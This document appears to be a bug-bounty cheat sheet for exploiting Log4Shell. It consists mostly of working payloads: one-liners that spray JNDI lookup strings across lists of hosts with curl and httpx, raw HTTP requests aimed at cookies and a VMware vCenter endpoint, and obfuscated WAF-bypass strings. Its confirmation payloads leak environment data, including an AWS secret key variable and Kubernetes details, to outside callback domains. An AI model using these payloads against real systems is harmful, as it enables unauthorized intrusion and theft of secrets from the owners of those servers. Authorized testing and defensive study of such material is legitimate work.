# Log4Shell Some Proved Testing Methods
 
## Oneliner 1:
```
$ cat vulnerable-hosts.txt | sed 's/https\?:\/\///' | xargs -I {} echo '{}/${jndi:ldap://{}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' >> L4SFuzzList
$ httpx -l L4SFuzzList
```
## Oneliner 2:
```
$ cat 1.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}";done (Credit:https://twitter.com/HackerGautam/status/1469751218926882816)
 ```
 
### The Great resource to learn and earn:
https://github.com/pentesterland/Log4Shell
 
### Screw-up the server (Run on your own risk). Gives you a lot fase-positives, but need to retest with other tools to confirm the valodation: 
```
cat vulnerable-hosts.txt |  httpx -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Cookie: mt.v=${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Cookie: CID_CART_COOKIE=${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'User-Agent: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'User-Agent: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Referer: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Origin: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Language: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-By: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-For: \${jndi:ldap://${hostName}.L4J.zdgnnnz669jsqwlr243a74pk1b72v5ju.oastify.com/a}' -H 'X-Forwarded-For-Original: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Host:${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Port: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Proto: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Protocol: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Scheme: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Server: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarded-Ssl: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forwarder-For: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forward-For: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Forward-Proto: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Frame-Options: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-From: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-Geoip-Country: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'X-XSRF-TOKEN: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Datetime: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Charset: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Encoding: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}' -H 'Accept-Language: ${jndi:ldap://x${hostName}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}'
```
```
GET /test?id=%24%7Bj%24%7B::-n%7Ddi:dns%24%7B::-:%7D//quua8mp7vfexh3a3qkf1sggj9%24%7B::-.%7Dcanarytokens.com%7D HTTP/1.1
User-Agent: ${j${::-n}di:dns${::-:}//quua8mp7vfexh3a3qkf1sggj9${::-.}canarytokens.com}
Origin: ${j${::-n}di:dns${::-:}//quua8mp7vfexh3a3qkf1sggj9${::-.}canarytokens.com}
Referer: ${j${::-n}di:dns${::-:}//quua8mp7vfexh3a3qkf1sggj9${::-.}canarytokens.com}
Cookie: LastMRH_Session=***; MRHSession=***
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
Host: ******
Connection: Keep-alive
 
``` 
```
$ curl test.domain.com -H 'Cookie: CU_BRAND=${jndi:ldap://${sys:java.version}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}'
```
 
### Cookie based Log4Shell RCE
```
GET / HTTP/2
Host: test.domain.com
Referer: https://www.google.com/search?BC=en&q=testing
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
Cookie: mt.v=***; CU_ACT=${jndi:ldap://${sys:java.version}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}; CID_CART_COOKIE=${jndi:ldap://${sys:java.version}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}; IBSD_LOCALE=en_US; CU_BRAND=${jndi:ldap://${sys:java.version}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}; jsession_unique_id=xx888dd667ggddd23454d
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
 
``` 
### VMware vCenter Log4Shell RCE
```
POST /analytics/telemetry/ph/api/hyper/send?_c=${jndi:ldap://${sys:java.version}.L4J.quua8mp7vfexh3a3qkf1sggj9.canarytokens.com/a}
Host: test.domain.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
 
``` 
### Some Great WAF-Bypass Payloads to Play With
```
CREDIT: https://musana.net
${jndi:ldap://domain.com/j}
${jndi:ldap:/domain.com/a}
${jndi:dns:/domain.com}
${jndi:dns://domain.com/j}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/j}
${${::-j}ndi:rmi://domain.com/j}
${jndi:rmi://domainldap.com/j}
${${lower:jndi}:${lower:rmi}://domain.com/j}
${${lower:${lower:jndi}}:${lower:rmi}://domain.com/j}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://domain.com/j}
${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://domain.com/j}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://domain.com/j}
${jndi:${lower:l}${lower:d}a${lower:p}://domain.com}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}
${jn${env::-}di:ldap://domain.com/j}
${jn${date:}di${date:':'}ldap://domain.com/j}
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://domain.com/j}
${j${main:\k5:-Nd}i${spring:k5:-:}ldap://domain.com/j}
${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://domain.com/j}
${j${::-nD}i${::-:}ldap://domain.com/j}
${j${EnV:K5:-nD}i:ldap://domain.com/j}
${j${loWer:Nd}i${uPper::}ldap://domain.com/j}
${jndi:ldap://127.0.0.1#domain.com/j}
${jnd${upper:ı}:ldap://domain.com/j}
${jnd${sys:SYS_NAME:-i}:ldap:/domain.com/j}
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://domain.com/j}
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://domain.com/j}
${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://domain.com/j}
${\u006a\u006e\u0064\u0069:ldap://domain.com/j}
${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.domain.com/j}
${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://domain.com/j}
%24%7Bjndi:ldap://domain.com/j%7D
%24%7Bjn$%7Benv::-%7Ddi:ldap://domain.com/j%7D
 
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a} (https://twitter.com/BountyOverflow/status/1470001858873802754) 
1. ${jndi:ldap://127.0.0.1:1389/ badClassName}
2. ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
3. ${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
4. ${jndi:rmi://adsasd.asdasd.asdasd}  - https://twitter.com/wugeej/status/1469982901412728832
 
jndi:
jn${env::-}di:
jn${date:}di${date:':'}
j${k8s:k5:-ND}i${sd:k5:-:}
j${main:\k5:-Nd}i${spring:k5:-:}
j${sys:k5:-nD}${lower:i${web:k5:-:}}
j${::-nD}i${::-:}
j${EnV:K5:-nD}i:
j${loWer:Nd}i${uPper::} https://twitter.com/ymzkei5/status/1469765165348704256
```

If you re filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you: (https://twitter.com/Rezn0k/status/1469523006015750146) 
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}
This gets past every filter I've found so far. There's no shortage of these bypasses.
 
### Different Types of Exploit Confirmation Payloads
### Docker Lookup
```
${jndi:ldap://${docker:containerId}.domain.com/j}
${jndi:ldap://${docker:containerName}.domain.com/j}
${jndi:ldap://${docker:imageId}.domain.com/j}
${jndi:ldap://${docker:imageName}.domain.com/j}
${jndi:ldap://${docker:shortContainerId}.domain.com/j}
${jndi:ldap://${docker:shortImageId}.domain.com/j}
```
### Environment Lookup
```
${jndi:ldap://${env:USER}.domain.com/j}
${jndi:ldap://${env:user}.domain.com/j}
${jndi:ldap://${env:COMPUTERNAME}.domain.com/j}
${jndi:ldap://${env:USERDOMAIN}.domain.com/j}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.domain.com/j}
${jndi:ldap://${hostName}.domain.com/j}
${jndi:ldap://${env:JAVA_VERSION}.domain.com/j}
```

### Java Lookup
```
${jndi:ldap://${java:version}.domain.com/j}
${jndi:ldap://${java:runtime}.domain.com/j}
${jndi:ldap://${java:vm}.domain.com/j}
${jndi:ldap://${java:os}.domain.com/j}
${jndi:ldap://${java:locale}.domain.com/j}
${jndi:ldap://${java:hw}.domain.com/j}
```

### Kubernetes Lookup
```
${jndi:ldap://${k8s:accountName}.domain.com/j}
${jndi:ldap://${k8s:clusterName}.domain.com/j}
${jndi:ldap://${k8s:containerId}.domain.com/j}
${jndi:ldap://${k8s:containerName}.domain.com/j}
${jndi:ldap://${k8s:host}.domain.com/j}
${jndi:ldap://${k8s:hostIp}.domain.com/j}
${jndi:ldap://${k8s:labels.app}.domain.com/j}
${jndi:ldap://${k8s:labels.podTemplateHash}.domain.com/j}
${jndi:ldap://${k8s:masterUrl}.domain.com/j}
${jndi:ldap://${k8s:namespaceId}.domain.com/j}
${jndi:ldap://${k8s:namespaceName}.domain.com/j}
${jndi:ldap://${k8s:podId}.domain.com/j}
${jndi:ldap://${k8s:podIp}.domain.com/j}
${jndi:ldap://${k8s:podName}.domain.com/j}
${jndi:ldap://${k8s:imageId}.domain.com/j}
${jndi:ldap://${k8s:imageName}.domain.com/j}
${jndi:ldap://.domain.com/j}
```

### Main Arguments Lookup
```
${jndi:ldap://${main:0}.domain.com/j}
${jndi:ldap://${main:1}.domain.com/j}
${jndi:ldap://${main:2}.domain.com/j}
${jndi:ldap://${main:3}.domain.com/j}
${jndi:ldap://${main:4}.domain.com/j}
${jndi:ldap://${main:\--file}.domain.com/j}
${jndi:ldap://${main:\-x}.domain.com/j}
${jndi:ldap://${main:bar}.domain.com/j}
${jndi:ldap://${main:\--quiet:-true}.domain.com/j}
 
### Web Lookup
${jndi:ldap://${web:attr.name}.domain.com/j}
${jndi:ldap://${web:contextPath}.domain.com/j}
${jndi:ldap://${web:contextPathName}.domain.com/j}
${jndi:ldap://${web:effectiveMajorVersion}.domain.com/j}
${jndi:ldap://${web:effectiveMinorVersion}.domain.com/j}
${jndi:ldap://${web:initParam.name}.domain.com/j}
${jndi:ldap://${web:majorVersion}.domain.com/j}
${jndi:ldap://${web:minorVersion}.domain.com/j}
${jndi:ldap://${web:rootDir}.domain.com/j}
${jndi:ldap://${web:serverInfo}.domain.com/j}
${jndi:ldap://${web:servletContextName}.domain.com/j}
```

### System Properties Lookup
```
${jndi:ldap://${sys:logPath}.domain.com/j}
${jndi:ldap://${sys:java.version}.domain.com/j}
${jndi:ldap://${sys:java.vendor}.domain.com/j}
```
 
### Structured Data Lookup
```
${jndi:ldap://${sys:logPath}.domain.com/j}
```

### Date Lookup
```
${jndi:ldap://${date:MM-dd-yyyy}.domain.com/j}
```

### Context Map Lookup
```
${jndi:ldap://${ctx:loginId}.domain.com/j}
```

### Some Great Keywords to pay with: 
Credit: https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
```
${ctx:loginId}
${map:type}
${filename}
${date:MM-dd-yyyy}
${docker:containerId}
${docker:containerName}
${docker:imageName}
${env:USER}
${event:Marker}
${mdc:UserId}
${java:runtime}
${java:vm}
${java:os}
${jndi:logging/context-name}
${hostName}
${docker:containerId}
${k8s:accountName}
${k8s:clusterName}
${k8s:containerId}
${k8s:containerName}
${k8s:host}
${k8s:labels.app}
${k8s:labels.podTemplateHash}
${k8s:masterUrl}
${k8s:namespaceId}
${k8s:namespaceName}
${k8s:podId}
${k8s:podIp}
${k8s:podName}
${k8s:imageId}
${k8s:imageName}
${log4j:configLocation}
${log4j:configParentLocation}
${spring:spring.application.name}
${main:myString}
${main:0}
${main:1}
${main:2}
${main:3}
${main:4}
${main:bar}
${name}
${marker}
${marker:name}
${spring:profiles.active[0]}
${sys:logPath}
${web:rootDir}
```
### Some Common Headers to test
```
Accept-Charset
Accept-Datetime
Accept-Encoding
Accept-Language
Authorization
Authorization: Basic 
Authorization: Bearer 
Authorization: Oauth 
Authorization: Token 
Cache-Control
Cf-Connecting_ip
CF-Connecting_IP
Client-Ip
Client-IP
Contact
Cookie
Destination
DNT
Forwarded
Forwarded-For
Forwarded-For-Ip
Forwarded-Proto
From
If-Modified-Since
Max-Forwards
Origin
Originating-Ip
Pragma
Profile
Proxy
Proxy-Host
Referer
TE
True-Client-Ip
True-Client-IP
Upgrade
User-Agent
Via
Warning
X-Api-Version
X-Arbitrary
X-Att-Deviceid
X-ATT-DeviceId
X-Client-Ip
X-Client-IP
X-Correlation-ID
X-Csrf-Token
X-CSRFToken
X-Do-Not-Track
X-Foo
X-Foo-Bar
X-Forwarded
X-Forwarded-By
X-Forwarded-For
X-Forwarded-For-Original
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Proto
X-Forwarded-Protocol
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded-Server
X-Forwarded-Ssl
X-Forwarder-For
X-Forward-For
X-Forward-Proto
X-Frame-Options
X-From
X-Geoip-Country
X-Host
X-Http-Destinationurl
X-HTTP-DestinationURL
X-Http-Host-Override
X-Http-Method
X-Http-Method-Override
X-HTTP-Method-Override
X-Http-Path-Override
X-Https
X-Htx-Agent
X-Hub-Signature
X-If-Unmodified-Since
X-Imbo-Test-Config
X-Insight
X-Ip
X-Ip-Trail
X-Leakix
X-Log
X-Original-URL
X-Originating-Ip
X-Originating-IP
X-ProxyUser-Ip
X-Real-Ip
X-Real-IP
X-Remote-Addr
X-Remote-Ip
X-Requested-With
X-Request-ID
X-UIDH
X-Wap-Profile
X-XSRF-TOKEN
```
 
## Best Repo - I use this a lot
https://github.com/fullhunt/log4j-scan 


## Refrence 
https://twitter.com/nav1n0x/status/1600916773171335179
